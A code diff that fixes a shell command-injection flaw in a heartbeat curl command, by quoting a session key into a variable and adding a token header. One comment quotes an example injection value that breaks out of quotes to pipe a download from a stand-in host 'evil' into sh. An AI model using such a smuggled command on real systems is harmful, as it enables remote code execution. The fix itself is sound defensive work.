@@ -119,9 +119,21 @@ def _with_heartbeat(agent: str, url: str, session_key: str) -> str:
     EXIT; killing the tab takes the whole shell (loop included) down with it."""
     # $(tty) is the tab's device (e.g. /dev/ttys003) — stable and reported on
     # every ping so the server can find and close this exact tab on delete.
+    #
+    # session_key is shell-quoted into a variable rather than interpolated into
+    # the JSON string: interpolating it raw allowed `x";curl evil|sh;echo "` to
+    # break out of the double quotes and inject commands. The payload is then
+    # assembled by concatenating single-quoted JSON fragments with the quoted
+    # variable and the $(tty) expansion, so neither value can escape.
+    key_var = f"__rd_key={_q(session_key)}; "
+    # Read the per-install token so the heartbeat POST passes the server's auth
+    # gate. Same machine/user, so the 0600 file is readable.
+    token_var = '__rd_tok=$(cat "${RUBBERDUCK_HOME:-$HOME/.rubberduck}/token" 2>/dev/null); '
     ping = (
-        f"curl -s -X POST {_q(url)} -H 'Content-Type: application/json' "
-        f'-d "{{\\"session_key\\":\\"{session_key}\\",\\"tty\\":\\"$(tty)\\"}}" '
+        f"{key_var}{token_var}"
+        "curl -s -X POST " + _q(url) + " -H 'Content-Type: application/json' "
+        '-H "X-Rubberduck-Token: $__rd_tok" '
+        '-d "{\\"session_key\\":\\"$__rd_key\\",\\"tty\\":\\"$(tty)\\"}" '
         ">/dev/null 2>&1"
     )
     return (
